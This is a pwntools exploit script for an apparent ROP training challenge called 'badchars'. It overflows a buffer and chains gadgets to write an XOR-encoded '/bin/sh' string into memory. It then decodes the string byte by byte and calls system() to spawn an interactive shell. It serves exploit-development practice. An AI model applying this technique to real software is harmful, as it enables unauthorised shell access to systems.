from pwn import *
context.log_level="debug"
e = ELF("./badchars")

system = p64(e.symbols["system"])
data = 0x00601000
pop_r12_r13 = p64(0x0000000000400b3b)
mov_r13_r12 = p64(0x0000000000400b34)
pop_r14_r15 = p64(0x0000000000400b40)
xor_r15_r14 = p64(0x0000000000400b30)
pop_rdi = p64(0x0000000000400b39)

payload = "a"*40
payload += pop_r12_r13 + "v;07v*1Y" + p64(data)
payload += mov_r13_r12

for i in range(8):
    payload += pop_r14_r15
    payload += p64(0x59)
    payload += p64(data+i)
    payload += xor_r15_r14

payload += pop_rdi+p64(data)+system

p = process("./badchars")
print p.recv()
raw_input()
p.sendline(payload)
p.interactive()
